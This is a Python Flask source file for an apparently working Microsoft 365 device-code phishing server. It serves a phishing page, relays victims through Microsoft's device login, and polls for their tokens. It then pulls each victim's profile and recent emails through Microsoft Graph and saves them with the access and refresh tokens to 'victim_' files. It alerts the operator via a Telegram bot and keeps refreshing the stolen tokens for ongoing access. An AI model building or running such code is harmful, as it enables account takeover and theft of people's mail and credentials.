from flask import Flask, request, jsonify, send_file
import requests
import json
import os
import time
import tempfile
import shutil
from datetime import datetime
import threading
from dotenv import load_dotenv
from pathlib import Path
import atexit
import uuid
from threading import Lock

PHISH_PORT = int(os.getenv('PHISH_PORT', 5000))

flow_lock = Lock()

load_dotenv()

app = Flask(__name__, template_folder='.')

CLIENT_ID = os.getenv("CLIENT_ID")
CLIENT_SECRET = os.getenv("CLIENT_SECRET")
SCOPES = "https://graph.microsoft.com/Mail.ReadWrite User.Read offline_access"

TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")

FLOWS_FILE = "active_flows.json"
active_flows = {}

print(f"🚀 Production server ready")
print(f"   Victims dir: {Path('.').resolve()}")

def load_persistent_flows():
    try:
        with open(FLOWS_FILE, 'r') as f:
            loaded = json.load(f)
        with flow_lock:
            active_flows.clear()
            active_flows.update(loaded)
        print(f"📁 Loaded {len(loaded)} flows")
    except:
        with flow_lock:
            active_flows.clear()

def save_persistent_flows():
    with flow_lock:
        flows_to_save = {k: v.copy() for k, v in active_flows.items()}

    try:
        with open(FLOWS_FILE, 'w') as f:
            json.dump(flows_to_save, f, indent=2)
    except: pass

# Init
load_persistent_flows()
atexit.register(save_persistent_flows)

def safe_graph_call(url, headers, timeout=15):
    try:
        resp = requests.get(url, headers=headers, timeout=timeout)
        if resp.status_code == 200:
            data = resp.json()
            return data if isinstance(data, dict) else {"error": "Invalid JSON"}
        return {"error": f"HTTP {resp.status_code}"}
    except:
        return {"error": "Network error"}

def safe_post_call(url, headers, data, timeout=15):
    try:
        resp = requests.post(url, headers=headers, json=data, timeout=timeout)
        return resp.status_code == 202
    except:
        return False

def atomic_save(data):
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    victim_id = (data.get("profile", {}).get("displayName") or "unknown").replace(" ", "_").replace("/", "_")[:20]
    final_name = f"victim_{victim_id}_{timestamp}.json"
    
    with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.tmp', dir='.') as tmp:
        try:
            json.dump(data, tmp, indent=2, ensure_ascii=False)
            tmp.flush()
            os.fsync(tmp.fileno())
            tmp.close()
            shutil.move(tmp.name, final_name)
            return final_name, None
        except Exception as e:
            try: os.unlink(tmp.name)
            except: pass
            return None, str(e)

def send_telegram(message, files=None):
    if not all([TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID]):
        print(f"📤 {message[:100]}...")
        return
    try:
        requests.post(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
                     json={"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "HTML"}, 
                     timeout=10)
    except: pass

@app.route('/')
def phishing_page():
    return send_file('phishing.html')

@app.route('/start')
def start_flow():
    """Auto-start device flow"""
    session_id = str(uuid.uuid4())
    success = start_device_flow(session_id)
    print(f"🚀 NEW FLOW: {session_id} {'✅' if success else '❌'}")
    with flow_lock:
         flow = active_flows.get(session_id)
    return jsonify({
    'session_id': session_id,
    'user_code': flow.get('user_code') if flow else None
    })


@app.route('/code')
def get_code():
    session_id = request.args.get('sid')
    if not session_id:
        return jsonify({'error': 'missing sid - call /start first'}), 400
    
    print(f"🔍 /code DEBUG: looking for sid={session_id}, active_flows has {len(active_flows)} entries")
    with flow_lock:
        flow = active_flows.get(session_id)
        print(f"🔍 FOUND: {bool(flow)}")
        if not flow:
            print(f"🔍 ACTIVE KEYS: {list(active_flows.keys())[:3]}...")
            return jsonify({'error': 'session missing', 'sid': session_id, 'total_flows': len(active_flows)}), 404
        
        # Always return user_code once created (supports personal/work accounts)
        if flow.get('user_code'):
            return jsonify({
                'code': flow['user_code'],
                'status': 'ready',
                'message': 'Copy code → microsoft.com/devicelogin',
                'session_valid': True
            })
        
        return jsonify({'status': 'generating', 'retry': 2})



def start_device_flow(session_id):
    if not CLIENT_ID: return False
    device_url = "https://login.microsoftonline.com/common/oauth2/v2.0/devicecode"
    
    try:
        print(f"🔄 Calling MS devicecode for {session_id}")
        resp = requests.post(device_url, data={
            "client_id": CLIENT_ID,
            "scope": SCOPES
        }, headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=15)
        print(f"📡 MS response status: {resp.status_code} | Text: {resp.text[:200]}")
        
        if resp.status_code != 200:
            print(f"❌ MS HTTP {resp.status_code}: {resp.text}")
            return False
        



        try:
            resp_json = resp.json()

        except:
            print(f"❌ MS invalid JSON: {resp.text[:200]}")
            return False

        with flow_lock:
            active_flows[session_id] = {
                'device_code': resp_json["device_code"],
                'user_code': resp_json["user_code"],
                'expires_in': resp_json["expires_in"],
                'interval': resp_json.get("interval", 5),
                'start_time': time.time(),
                'polling': False
            }
        
        threading.Thread(target=poll_tokens, args=(session_id,), daemon=True).start()
        save_persistent_flows()
        return True
    except Exception as e:
        print(f"❌ START FAILED {session_id}: {e}")
        import traceback
        traceback.print_exc()
        return False


def poll_tokens(session_id):
    poll_url = "https://login.microsoftonline.com/common/oauth2/v2.0/token"
    
    while True:
        with flow_lock:
            if session_id not in active_flows:
                break
            flow = active_flows[session_id].copy()
            if flow is None:
                break
            if time.time() - flow['start_time'] > flow['expires_in']:
                del active_flows[session_id]
                break
        
        try:
            resp = requests.post(poll_url, data={
                "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
                "client_id": CLIENT_ID, 
                "device_code": flow['device_code']
            }, headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=15).json()
            if "access_token" in resp:
                handle_tokens(session_id, resp)
                return
            elif resp.get("error") == "authorization_pending":
                time.sleep(flow['interval'])
            else:
                time.sleep(5)
        except: time.sleep(5)



def handle_tokens(session_id, tokens_resp):
    access_token = tokens_resp.get("access_token")
    refresh_token = tokens_resp.get("refresh_token")
    if not access_token or not refresh_token: 
        return
        
    headers = {"Authorization": f"Bearer {access_token}"}
    
    profile = safe_graph_call("https://graph.microsoft.com/v1.0/me", headers)
    if error := profile.get("error"):
        print(f"❌ Graph profile error for {session_id}: {error}")
        return
        
    mailbox = safe_graph_call("https://graph.microsoft.com/v1.0/me/mailFolders/inbox/childFolderCounts", headers)
    emails = safe_graph_call("https://graph.microsoft.com/v1.0/me/messages?$select=id,subject,from,receivedDateTime,isRead,bodyPreview&$orderby=receivedDateTime desc", headers)
    
    
    save_data = {
        "victim_id": profile.get("displayName", "unknown").replace(" ", "_")[:20],
        "timestamp": datetime.now().strftime("%Y%m%d_%H%M%S"),
        "profile": profile,
        "mailbox": mailbox,
        "emails": emails.get("value", []),
        "tokens": {
            "access_token": access_token,
            "refresh_token": refresh_token
        }
    }
    
    filename, error = atomic_save(save_data)
    if filename:
        print(f"✅ virus: {filename}")
        send_telegram(f"""
🔥 <b>Virus CAPTURED</b>
👤 <b>{profile.get('displayName')}</b>
📧 <code>{profile.get('mail')}</code>
✅ <code>{filename}</code>
        """, [filename])

    # Start refresh thread to keep tokens alive
    threading.Thread(target=token_refresh_loop, args=(session_id, refresh_token, access_token), daemon=True).start()


def token_refresh_loop(session_id, refresh_token, current_access_token):
    refresh_url = "https://login.microsoftonline.com/common/oauth2/v2.0/token"
    
    while True:
        try:
            time.sleep(3000)  # Refresh every 50 minutes (access tokens last ~1hr)
            
            with flow_lock:
                if session_id not in active_flows:
                    break
                flow = active_flows[session_id]
            
            # Refresh token
            resp = requests.post(refresh_url, data={
                "grant_type": "refresh_token",
                "client_id": CLIENT_ID,
                "refresh_token": refresh_token,
                "scope": SCOPES
            }, headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=15).json()
            
            if "access_token" in resp:
                new_access_token = resp["access_token"]
                new_refresh_token = resp.get("refresh_token", refresh_token)  # MS sometimes rotates refresh tokens
                
                # Test new token
                headers = {"Authorization": f"Bearer {new_access_token}"}
                test_profile = safe_graph_call("https://graph.microsoft.com/v1.0/me", headers)
                
                if not test_profile.get("error"):
                    print(f"🔄 Token refreshed for {session_id}")
                    
                    with flow_lock:
                        if session_id in active_flows:
                            active_flows[session_id]['access_token'] = new_access_token
                            active_flows[session_id]['refresh_token'] = new_refresh_token
                            active_flows[session_id]['last_refresh'] = time.time()
                
                refresh_token = new_refresh_token  # Update for next refresh
            else:
                print(f"❌ Refresh failed for {session_id}: {resp.get('error_description', 'unknown')}")
                break
                
        except Exception as e:
            print(f"❌ Refresh error {session_id}: {e}")
            time.sleep(300)


@app.route('/status')
def status():
    with flow_lock:
        active_count = len(active_flows)
        
    return jsonify({
        "active_flows": active_count,
        "victim_files": len(list(Path(".").glob("victim_*.json"))),
        "phishing_ready": Path('phishing.html').exists()
    })

if __name__ == '__main__':
    print("🚀 http://0.0.0.0:5000")
    app.run(host='0.0.0.0', port=5000, debug=False, threaded=True)